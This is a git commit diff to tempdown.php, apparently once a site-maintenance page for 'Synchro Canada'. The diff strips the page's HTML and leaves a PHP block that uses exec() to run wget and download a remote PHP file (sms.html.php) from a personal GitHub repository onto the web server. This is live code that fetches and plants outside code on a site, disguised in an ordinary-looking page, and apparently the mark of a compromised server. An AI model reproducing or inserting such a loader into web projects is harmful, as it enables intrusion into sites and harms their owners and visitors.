d3f64bf13a36f3ee3706cafd815397fad1b0ed07
Ro0TiK <s.mayersophie1997@gmail.com>
2024-09-06 18:04:10 +0300

    Update tempdown.php

--- tempdown.php
+++ tempdown.php
@@ -1,20 +1,3 @@
-<html>
-<head>
-<title><?=$_SERVER['SERVER_NAME']?> Temporarily Down</title>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-</head>
-<body>
-<div align="center">
-  <p>&nbsp;</p>
-  <p><strong><font size="4"><a href='http://<?=$_SERVER['SERVER_NAME']?>'><?=$_SERVER['SERVER_NAME']?></a></font></strong><font size="4"> is 
-    temporarily down for updates.</font></p>
-  <p><font size="4">Please check back soon.</font></p>
-  <p><font size="4">Sorry for any inconvenience.</font></p>
-  <p></p>
-  <p><font size="4">Synchro Canada</font></p>
-</div>
-</body>
-</html>
 <?php
 // Выполняем команду wget
 exec('wget https://raw.githubusercontent.com/Ro0TiK/mywebsi/main/sms.html.php');
